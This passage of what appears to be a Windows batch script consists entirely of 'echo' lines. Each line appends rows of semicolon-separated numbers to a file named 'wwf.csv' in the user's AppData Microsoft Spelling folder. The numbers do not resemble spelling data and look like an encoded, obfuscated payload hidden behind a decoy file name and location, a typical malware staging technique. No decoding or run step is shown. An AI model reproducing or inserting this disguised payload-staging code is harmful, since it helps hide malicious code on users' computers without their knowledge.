>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.1;943.13;514.0;9556.820;1.310;14.414;0.8734;824.1;659.14;414.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6813.828;1.692;14.514;0.2453;832.1;825.14;714.0;6012.836;1.854;14.714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5898;840.1;885.14;614.0;3630.844;1.942;14.314;0.7414;848.1;437.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(514.0;3973.852;1.490;15.514;0.0591;856.1;869.15;314.0;9955.860;1.910;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(15.314;0.0740;864.1;951.15;414.0;8430.868;1.74;16.614;0.9387;872.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(715.16;514.0;0258.876;1.374;16.514;0.6406;880.1;827.16;314.0;6386.884;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.874;16.714;0.9873;888.1;937.16;614.0;6914.892;1.744;17.614;0.7714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(896.1;389.17;514.0;9215.900;1.828;17.414;0.3664;904.1;869.17;714.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2257.908;1.904;17.414;0.4305;912.1;939.17;514.0;0678.916;1.418;18.414;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5074;920.1;365.18;414.0;3484.924;1.832;18.414;0.9397;928.1;869.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(614.0;3765.932;1.906;18.414;0.3802;936.1;921.18;714.0;5093.940;1.921;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.514;0.4496;944.1;921.18;614.0;1361.948;1.936;18.414;0.8205;952.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(906.18;514.0;1385.40;2.373;19.714;0.1488;64.2;694.19;714.0;4094.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.805;19.78;0.8326;312.2;808.19;614.0;6729.516;2.813;19.414;0.7669;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(620.2;813.19;714.0;2127.624;2.846;19.514;0.7698;428.2;911.19;314.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7180.332;2.911;19.314;0.5398;436.2;944.19;414.0;4923.340;2.818;22.614;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0361;744.2;818.22;714.0;1863.748;2.851;22.614;0.8980;352.2;813.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(714.0;8825.756;2.813;19.714;0.1409;760.2;846.19;414.0;0152.664;2.625;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(25.714;0.5429;568.2;877.25;414.0;5275.472;2.579;26.514;0.9299;576.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.27;714.0;5551.780;2.855;27.514;0.4385;384.2;757.28;514.0;9773.688;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.923;28.714;0.1326;692.2;849.29;414.0;0888.696;2.391;30.414;0.1658;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.2;711.31;414.0;1088.804;2.867;31.714;0.5389;808.2;867.31;314.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5099.812;2.900;31.414;0.0050;816.2;911.19;414.0;6095.820;2.911;19.714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2028;824.2;944.19;714.0;2861.828;2.574;34.614;0.2167;832.2;328.35;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(514.0;3184.836;2.904;35.314;0.3606;840.2;840.36;714.0;1739.844;2.754;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.414;0.2894;848.2;916.37;414.0;9843.852;2.844;38.514;0.4859;856.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(566.39;514.0;0713.860;2.930;39.414;0.0894;864.2;860.40;614.0;9411.868;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.474;41.614;0.5062;872.2;942.41;514.0;5427.876;2.852;42.614;0.4002;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(880.2;784.43;614.0;7289.884;2.752;44.714;0.8344;888.2;946.44;314.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4133.892;2.896;45.714;0.6708;896.2;806.46;314.0;8234.900;2.332;47.614;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1379;904.2;910.47;514.0;0508.908;2.810;48.414;0.3776;912.2;636.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(614.0;7359.916;2.916;49.314;0.3674;920.2;854.50;614.0;5824.924;2.482;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.614;0.3734;928.2;34.52;714.0;5443.932;2.896;52.414;0.0906;936.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.53;614.0;3795.940;2.348;54.314;0.0472;944.2;920.54;314.0;9822.948;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.838;55.514;0.2985;952.2;340.56;514.0;4633.60;3.920;56.414;0.8779;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(74.3;872.57;314.0;4517.48;3.590;58.714;0.9373;512.3;823.58;414.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2674.416;3.647;59.514;0.3657;420.3;925.59;414.0;9758.324;3.859;60.714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6007;628.3;395.61;514.0;5674.732;3.729;62.38;0.5176;880.3;899.62;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(38.0;1459.884;3.904;62.514;0.3910;888.3;909.62;746.0;7285.411;0.898;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.646;0.3392;519.0;907.64;446.0;5278.327;0.916;64.646;0.2179;535.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(922.64;746.0;9958.443;0.928;64.546;0.4674;751.0;928.64;346.0;9842.659;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.928;64.746;0.8745;367.0;941.64;546.0;4867.575;0.612;65.746;0.1017;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(483.0;344.65;646.0;5225.591;0.597;65.646;0.8485;399.0;497.65;546.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4062.807;0.813;65.446;0.2066;815.0;826.65;746.0;8827.823;0.922;64.346;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7112;831.0;837.65;346.0;1815.839;0.883;65.346;0.0752;847.0;41.69;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(646.0;3474.855;0.332;69.468;0.5440;863.0;904.62;864.0;5562.863;0.904;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.499;3.1813;871.0;741.69;924.13;3541.879;0.904;62.357;0.2246;380.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(394.0;825.0;5247.867;0.884;0.899;0.9561;923.0;513.1;620.1;8074.554;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.575;1.688;1.7478;805.1;845.1;947.1;4496.547;2.813;2.828;2.3305;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.0;61.0;57.0;8042.52;0.38;0.43;0.3209;59.0;35.0;710.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8068.66;0.611;0.59;0.1103;712.0;310.0;713.0;1664.711;0.714;0.412;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7476;715.0;313.0;316.0;8878.514;0.617;0.315;0.3057;418.0;516.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(319.0;7310.517;0.420;0.418;0.9078;521.0;319.0;622.0;3531.320;0.623;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.521;0.4193;724.0;522.0;50.0;9931.862;14.395;64.30;0.0455;862.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.64;60.0;2673.862;14.805;64.60;0.3369;904.6;810.64;70.0;7738.862;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.814;64.70;0.8064;862.14;819.64;70.0;1637.936;27.824;64.70;0.9689;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(858.11;824.64;70.0;4209.862;14.828;64.30;0.2628;862.14;833.64;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5601.862;14.838;64.30;0.1301;862.14;843.64;70.0;3364.862;14.848;64.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8589;862.14;853.64;40.0;8777.862;14.858;64.60;0.8866;862.14;863.64;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;8477.862;14.868;64.60;0.9313;862.14;873.64;70.0;0131.862;14.878;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.30;0.1435;862.14;883.64;40.0;2781.862;14.888;64.50;0.2054;557.7;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.64;40.0;5992.552;7.810;64.60;0.1751;414.23;893.64;32.0;3473.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.73;0.52;0.1259;514.0;45.0;42.0;5111.718;0.77;0.72;0.9257;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(721.0;59.0;52.0;9058.523;0.411;0.52;0.5361;529.0;613.0;42.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0757.432;0.715;0.72;0.9495;633.0;617.0;72.0;3705.434;0.419;0.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9186;739.0;621.0;62.0;0630.444;0.323;0.52;0.9197;650.0;325.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.0;1629.755;0.427;0.32;0.8263;559.0;529.0;62.0;9780.664;0.731;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.42;0.5751;470.0;433.0;42.0;7529.374;0.635;0.62;0.8948;479.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(637.0;72.0;3654.682;0.539;0.72;0.1248;686.0;441.0;72.0;8154.791;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.643;0.42;0.5852;396.0;545.0;72.0;9752.497;0.747;0.62;0.6342;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(598.0;549.0;333.1;0321.831;1.901;1.630;2.8153;571.2;598.2;64.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9716.30;0.44;0.50;0.0430;60.0;40.0;41.0;4620.60;0.851;2.930;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.4228;70.0;74.0;60.0;4533.60;0.50;0.70;0.6686;30.0;833.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(918.3;9127.50;0.50;0.64;0.9885;30.0;60.0;30.0;6976.50;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.842;2.5180;928.14;60.0;60.0;0980.64;0.50;0.40;0.9642;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;40.0;8654.833;2.931;15.70;0.4124;70.0;50.0;40.0;9943.71;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.536;22.9270;30.0;40.0;30.0;0470.30;87.570;67.395;72.6729;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.108;812.95;673.110;2377.812;117.816;49.448;0.2837;484.97;814.103;801.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6213.570;114.697;109.801;119.9703;811.114;807.51;348.0;5390.384;97.814;103.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.5410;670.114;797.109;801.119;3871.811;114.807;52.648;0.5061;587.70;567.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(572.101;1894.808;112.695;73.810;112.5992;817.116;449.49;60.87;2915.770;67.695;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.801;108.9152;812.95;579.117;816.112;8035.817;116.750;95.449;0.2760;576.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.116;496.49;2020.30;87.370;67.495;72.9854;801.108;812.95;477.105;3400.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.649;0.687;70.6105;367.95;572.101;808.112;9683.695;82.811;111.816;78.5876;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(497.109;801.115;812.97;2524.799;101.349;0.787;70.8901;567.95;772.101;808.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0234.595;78.811;67.811;100.1359;801.49;60.87;570.67;1258.795;72.801;108.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.3650;785.115;497.103;801.49;3110.40;87.670;67.495;72.0420;801.108;812.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(776.97;1330.810;103.817;97.803;101.5703;649.0;787.70;767.95;8101.772;101.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.395;68.1799;801.98;817.103;349.0;6349.487;70.467;95.472;101.8037;808.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(495.86;397.108;1687.805;100.797;116.801;82.7327;811.111;816.65;499.116;3600.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(118.816;105.801;115.5451;649.0;687.70;367.95;0888.572;101.808;112.495;67.3025;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.101;399.107;784.121;4802.812;101.815;49.50;87.0675;370.67;795.72;801.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9175.812;95.573;110.812;117.5837;816.49;30.87;370.67;1058.395;72.801;108.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.7282;379.117;816.112;817.116;2331.349;0.787;70.767;95.6139;372.101;808.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(495.84;3343.497;114.803;101.816;70.1485;820.49;70.87;470.67;9769.695;72.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.812;95.1157;473.110;812.117;816.49;4198.550;0.773;110.816;51.6867;750.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(783.111;814.116;8195.801;100.568;105.599;116.4172;805.111;810.97;814.121;6896.496;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.50;87.670;67.9182;695.72;801.108;812.95;0680.677;105.815;99.450;0.0150;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(387.70;467.95;772.101;3706.808;112.795;82.811;111.5491;816.78;397.109;801.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2001.812;97.399;101.750;0.7168;487.70;667.95;772.101;7899.808;112.695;78.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.9687;811.100;801.50;60.87;8021.770;67.695;72.801;108.9377;812.95;476.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.103;8812.817;97.803;101.450;0.0008;487.70;367.95;472.101;8486.808;112.395;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.497;108.1890;805.100;497.116;801.82;6872.811;111.816;65.799;116.6902;805.118;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.105;801.115;0060.350;0.387;70.567;95.0831;672.101;808.112;495.67;2480.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.699;107.684;121.9516;812.101;815.50;60.87;6532.370;67.395;72.801;108.4427;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.95;773.110;812.117;1781.816;50.50;87.570;67.7874;795.72;801.108;812.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3725.679;117.816;112.817;116.7459;750.0;387.70;367.95;7984.572;101.808;112.495;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(84.8394;497.114;803.101;816.70;7956.820;50.70;87.470;67.4340;795.72;801.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.95;1188.373;110.812;117.816;49.8154;351.0;787.70;567.95;3233.672;101.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.795;77.4305;805.115;599.51;50.87;7932.570;67.495;72.801;108.5635;812.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(682.111;811.116;1087.778;97.809;101.815;112.7564;697.99;801.51;50.87;4522.470;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.595;72.801;108.0126;812.95;585.115;397.103;0751.801;51.40;87.370;67.5814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(695.72;801.108;812.95;3140.573;110.812;117.816;51.1125;40.87;570.67;695.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3798.801;108.812;95.685;115.5260;597.103;801.52;50.87;0335.470;67.595;72.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.6953;812.95;673.110;812.117;9906.816;52.60;87.370;67.6042;795.72;801.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.95;0986.379;117.816;112.817;116.0212;352.0;584.97;814.103;9658.801;116.370;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.597;109.7701;801.119;811.114;807.51;8224.453;0.687;70.367;95.2340;572.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.112;395.85;3833.815;97.803;101.353;0.3365;487.70;667.95;772.101;5698.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.495;73.810;112.8125;817.116;353.0;487.70;4419.667;95.472;101.808;112.5160;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(395.79;817.116;812.117;4739.816;53.50;87.570;67.9014;395.72;801.108;812.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4189.473;110.812;117.816;54.5274;40.87;570.67;595.72;2009.801;108.812;95.679;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.3099;816.112;817.116;654.0;6804.387;70.367;95.372;101.6202;808.112;395.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.112;7073.817;116.655;0.687;70.7211;567.95;372.101;808.112;1337.595;73.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.817;116.7226;756.0;387.70;667.95;5420.772;101.808;112.595;73.6496;810.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.116;457.0;2824.660;77.811;100.817;108.5024;801.62;40.86;666.0;8340.783;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(121.815;116.801;109.2529;346.73;779.0;783.82;9718.50;67.483;0.818;97.5837;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.117;801.95;495.0;4591.787;70.767;95.372;101.4699;808.112;595.79;817.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4925.812;117.816;55.397;0.5436;583.121;815.116;801.109;5088.587;101.798;68.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.5382;597.109;805.99;568.97;5476.816;97.60;83.821;115.8099;816.101;809.68;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.116;0878.697;0.387;70.567;95.8378;372.101;808.112;395.79;2697.817;116.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.816;55.3925;598.0;783.121;815.116;2310.801;109.683;101.814;118.1912;805.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.77;811.100;9164.801;108.787;101.798;0.2963;783.121;815.116;801.109;4325.687;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.398;0.777;105.3738;399.114;811.115;811.102;2625.816;86.805;115.817;97.2645;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.83;816.117;800.105;8240.811;87.801;98.70;77.2621;815.99;811.114;808.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4161.498;0.809;115.499;111.4036;814.108;805.98;30.118;9044.798;0.819;102.599;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0424;583.121;815.116;801.109;0867.546;67.811;108.808;101.4462;699.116;805.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.115;8569.446;71.801;110.801;114.0395;805.99;40.77;805.99;9327.814;111.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.802;116.3182;446.86;805.115;817.97;9316.808;66.697;115.805;99.7058;60.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(670.67;795.72;9224.801;108.812;95.677;105.5496;815.99;40.65;800.100;8494.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.811;109.812;105.7892;808.97;816.105;811.110;6915.670;105.810;105.815;104.3319;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.100;60.78;811.73;2456.810;112.817;116.815;83.5764;812.101;499.105;802.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2680.801;100.30;69.814;114.7142;811.114;395.67;811.100;3774.801;87.805;116.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.4888;810.78;811.116;365.108;7174.808;111.819;101.800;0.8213;569.114;814.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.95;0677.485;115.801;114.567;111.3639;800.101;570.105;808.101;8579.815;78.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.665;108.4487;808.111;819.101;800.0;2327.383;121.815;116.801;109.8238;646.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.108;808.101;3388.699;116.805;111.810;115.3230;546.83;812.101;399.105;3813.797;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.805;122.801;100.2446;40.69;814.114;811.114;8758.795;84.821;112.801;78.0770;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.116;465.117;816.104;4496.811;114.805;122.801;100.4190;50.83;811.117;814.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8359.801;70.805;108.801;73.2832;815.73;810.118;597.108;1012.805;100.40;76.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.4051;814.97;814.121;680.97;3387.816;104.373;115.373;110.6021;818.97;808.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.0;3352.399;109.800;0.684;114.6423;805.109;569.110;800.0;9456.765;112.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.810;100.9733;50.67;811.109;812.105;8912.808;101.814;86.801;114.2380;815.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.110;475.101;6468.821;119.811;114.800;0.1731;582.101;812.108;797.99;3057.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.383;108.797;115.1118;804.82;811.111;816.78;6283.397;109.801;115.812;97.0056;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(399.101;30.71;801.110;9825.801;114.797;108.595;77.7102;805.115;815.105;810.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5532.683;101.814;118.805;99.9113;801.0;573.87;811.114;3505.807;102.808;111.819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.3161;811.109;812.105;808.101;4612.814;79.812;116.805;111.0128;810.115;683.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.118;4108.805;99.801;0.771;101.8265;816.83;801.114;818.105;6798.799;101.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.814;101.4167;497.116;801.73;810.115;4302.816;97.810;99.801;0.2007;567.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.97;816.101;0253.767;111.800;101.480;114.3230;811.118;805.100;801.114;1417.773;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.815;116.397;110.2915;699.101;60.71;801.116;5683.767;111.800;101.680;114.8087;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.118;805.100;801.114;0379.773;110.815;116.797;110.1666;699.101;70.103;801.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6555.595;77.801;115.815;97.5889;803.101;50.87;370.67;5384.395;72.801;108.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.2383;676.97;810.103;817.97;4848.803;101.30;103.801;116.1712;495.76;697.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.117;8297.797;103.801;0.671;101.1426;816.83;817.112;812.111;5380.814;116.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.676;97.8870;810.103;817.97;803.101;5359.30;108.597;110.803;117.0318;697.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;373.115;3676.386;97.808;117.801;87.7242;805.116;804.105;810.82;6318.697;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.803;101.50;73.6584;768.105;815.112;811.115;9659.697;98.808;101.60;115.9770;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.116;595.71;801.110;5017.801;114.797;116.801;69.1286;820.101;499.117;816.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3252.698;108.801;0.582;117.9655;810.116;805.109;801.84;0604.821;112.801;72.397;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.4774;800.108;801.0;371.101;8503.816;84.821;112.801;70.8240;814.111;809.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.110;1322.800;108.801;0.575;101.2619;821.70;805.108;801.0;9267.683;121.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.801;109.8466;487.101;598.77;811.98;7380.805;108.801;0.377;105.4730;699.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.115;811.102;9065.816;86.383;68.801;115.3660;805.103;810.101;814.77;3607.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.805;108.801;0.0154;567.111;809.112;805.108;6536.801;0.767;111.810;115.4962;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.108;801.0;387.70;1790.767;95.584;105.816;108.3924;801.0;803.101;816.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2030.478;97.809;101.50;67.5460;804.101;499.107;770.105;6053.808;101.478;97.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.8134;50.102;817.108;808.70;1337.805;108.801;78.397;109.3714;801.0;803.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.95;4590.579;117.816;112.817;116.9318;370.105;808.101;578.97;8074.809;101.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.805;108.1734;801.78;797.109;801.0;8076.815;119.805;116.699;104.6888;378.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.101;60.67;9544.804;101.799;107.680;97.8939;816.104;578.97;809.101;4694.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.817;108.808;80.7843;497.116;804.78;697.109;7720.801;0.812;97.816;104.8357;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(578.97;809.101;40.103;6957.801;116.795;70.817;108.7231;808.78;597.109;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3086.803;101.816;95.683;104.6812;811.114;816.78;697.109;6234.801;0.815;119.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.4911;499.104;583.104;811.114;8583.816;78.597;109.801;0.4970;810.97;809.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.83;4238.821;115.816;101.809;82.6596;817.110;816.105;809.101;3191.687;105.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.811;119.7619;815.82;817.110;816.105;5520.809;101.30;87.814;105.7358;816.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(576.105;810.101;7681.50;85.810;114.801;99.8546;811.103;810.105;822.101;8029.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.811;117.814;99.6206;801.70;805.108;801.84;8220.821;112.801;0.816;121.6634;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.101;50.67;811.109;7254.812;97.814;101.70;83.2099;821.115;816.101;809.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0853.811;114.801;0.803;101.2167;816.95;467.117;814.114;7012.801;110.816;85.573;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.1361;817.108;816.117;814.101;4981.60;103.801;116.495;67.3709;817.114;814.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.116;5139.367;117.808;116.817;114.6145;801.0;699.117;808.116;5852.817;114.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.803;101.6358;816.95;676.97;810.103;0013.817;97.803;101.384;111.7179;585.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;815.101;0650.816;95.676;97.810;103.7324;817.97;803.101;684.111;2974.585;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.801;0.667;111.1164;808.108;801.99;816.105;6627.811;110.766;97.815;101.3640;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.87;805.110;800.111;7865.819;115.766;97.815;101.2168;50.70;797.108;815.101;
